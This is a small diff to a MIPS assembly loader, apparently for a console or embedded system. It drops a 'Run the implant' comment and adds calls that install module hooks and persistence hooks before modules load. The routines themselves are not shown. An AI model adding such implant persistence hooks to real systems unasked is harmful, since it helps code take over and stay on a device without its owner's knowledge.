@@ -58,12 +58,15 @@ loader_continue:
 	addiu $a0, $zero, 0
 	jal FlushCache
 	addiu $a0, $zero, 2
-	
-# Run the implant.
+
 loader_run:
 	jal apply_relocations
 	nop
 	jal cleanup
+	nop
+	jal install_module_hooks
+	nop
+	jal install_persistence_hooks
 	nop
 	jal load_modules
 	nop
